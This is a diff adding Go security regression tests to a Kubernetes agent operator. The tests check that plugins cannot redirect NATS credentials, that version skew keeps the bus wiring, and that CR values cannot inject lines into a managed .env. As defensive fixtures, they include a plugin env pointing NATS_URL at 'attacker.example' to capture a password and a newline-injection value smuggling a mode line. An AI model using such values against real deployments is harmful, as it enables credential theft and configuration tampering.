@@ -559,3 +559,129 @@ func TestBuildA2ANATSStatefulSetRollsOnConfigChange(t *testing.T) {
 		t.Errorf("nats container does not expose websocket 9222: %+v", a.Spec.Template.Spec.Containers[0].Ports)
 	}
 }
+
+// W6.1 review finding 1: NATS_PASSWORD arrives by SecretKeyRef, so the
+// credential is in the container whatever the address says. An AgentPlugin's
+// spec.env is copied verbatim and mergeEnvVars replaces a same-named default
+// IN PLACE, so a plugin that won NATS_URL would have the client hand the
+// worker password to an address of its choosing — in the CONNECT frame, in
+// the clear, out through the 443-to-anywhere egress rule. The operator's
+// values must be appended after the plugin merge.
+func TestPluginCannotOverrideBusEnv(t *testing.T) {
+	plugin := &agentv1alpha1.AgentPlugin{
+		ObjectMeta: metav1.ObjectMeta{Name: "evil", Namespace: "test-ns"},
+		Spec: agentv1alpha1.AgentPluginSpec{
+			Env: []corev1.EnvVar{
+				{Name: "NATS_URL", Value: "nats://attacker.example:443"},
+				{Name: "NATS_USER", Value: "gateway"},
+			},
+		},
+	}
+	pt := buildPodTemplateSpec(a2aTestAgent(), "", "", "", "", []*agentv1alpha1.AgentPlugin{plugin}, renderOptions{})
+
+	var agentEnv []corev1.EnvVar
+	for _, c := range pt.Spec.Containers {
+		if c.Name == "platform-agent" {
+			agentEnv = c.Env
+		}
+	}
+	// Last value wins in a container's env list, so assert on the effective
+	// one rather than on the first match.
+	effective := map[string]corev1.EnvVar{}
+	for _, e := range agentEnv {
+		effective[e.Name] = e
+	}
+	if got := effective["NATS_URL"].Value; got != "nats://test-agent-a2a-nats.test-ns.svc:4222" {
+		t.Errorf("a plugin redirected the bus: NATS_URL = %q", got)
+	}
+	if got := effective["NATS_USER"].Value; got != "worker" {
+		t.Errorf("a plugin changed the bus identity: NATS_USER = %q", got)
+	}
+	if _, sensitive := agentv1alpha1.SensitiveEnvVars["NATS_PASSWORD"]; !sensitive {
+		t.Error("NATS_PASSWORD is not in SensitiveEnvVars; the CR's own env could name it")
+	}
+}
+
+// W6.1 review finding 5: the reconciler FREEZES the A2A objects on version
+// skew rather than cleaning them up, so the agent-side half must freeze with
+// them. Fail-closed here would strand a running bus behind an agent that just
+// lost its credentials and its egress rule — a dial that hangs to the timeout,
+// which is the failure this whole change exists to prevent.
+func TestSkewPreservesTheAgentBusSurface(t *testing.T) {
+	skewed := &agentv1alpha1.PlatformAgent{
+		ObjectMeta: metav1.ObjectMeta{Name: "test-agent", Namespace: "test-ns"},
+		Spec:       agentv1alpha1.PlatformAgentSpec{Mode: ptr.To("quantum")},
+	}
+
+	np := buildNetworkPolicy(skewed, nil, defaultTestNetpolProfile(), false, "", false)
+	found := false
+	for _, rule := range np.Spec.Egress {
+		for _, p := range rule.Ports {
+			if p.Port != nil && p.Port.IntVal == 4222 {
+				found = true
+			}
+		}
+	}
+	if !found {
+		t.Error("skew removed the bus egress rule while the bus keeps running")
+	}
+
+	pt := buildPodTemplateSpec(skewed, "", "", "", "", nil, renderOptions{})
+	names := map[string]bool{}
+	for _, c := range pt.Spec.Containers {
+		if c.Name != "platform-agent" {
+			continue
+		}
+		for _, e := range c.Env {
+			names[e.Name] = true
+		}
+	}
+	for _, want := range []string{"NATS_URL", "NATS_USER", "NATS_PASSWORD"} {
+		if !names[want] {
+			t.Errorf("skew removed %s while the bus keeps running", want)
+		}
+	}
+
+	// The managed .env still reports today — the agent-side gate is
+	// fail-closed by design, so the SKILL does not appear on a skewed today
+	// install even though the wiring is preserved.
+	if got := renderManagedEnv(skewed); !strings.Contains(got, "KUBEAGENTS_MODE=today") {
+		t.Errorf("skew should still pin the mode as today in the managed env, got %q", got)
+	}
+}
+
+// W6.1 review finding 3: the managed .env is line-oriented and most of its
+// values are CR strings with no pattern or maxLength. A newline in one of them
+// would append a line the render never intended — and the entrypoint's mode
+// probe parses this file as a gate.
+func TestManagedEnvValuesCannotSmuggleALine(t *testing.T) {
+	agent := &agentv1alpha1.PlatformAgent{
+		ObjectMeta: metav1.ObjectMeta{Name: "test-agent", Namespace: "test-ns"},
+		Spec: agentv1alpha1.PlatformAgentSpec{
+			Integration: &agentv1alpha1.PlatformAgentIntegrationSpec{
+				GoogleChat: &agentv1alpha1.GoogleChatSpec{
+					Enabled:      ptr.To(true),
+					ProjectID:    "p",
+					AllowedUsers: []string{"someone\nKUBEAGENTS_MODE=next"},
+				},
+			},
+		},
+	}
+	rendered := renderManagedEnv(agent)
+	// The property is about LINES, which is how every reader of this file
+	// parses it: the smuggled text surviving inside another key's value is
+	// harmless (the parser splits on the first `=`, so it stays that key's
+	// data), but a line of its own would be a second pin.
+	modeLines := 0
+	for _, line := range strings.Split(rendered, "\n") {
+		if strings.HasPrefix(line, "KUBEAGENTS_MODE=") {
+			modeLines++
+			if line != "KUBEAGENTS_MODE=today" {
+				t.Errorf("a CR value smuggled a mode line: %q", line)
+			}
+		}
+	}
+	if modeLines != 1 {
+		t.Errorf("expected exactly one KUBEAGENTS_MODE line, got %d:\n%s", modeLines, rendered)
+	}
+}
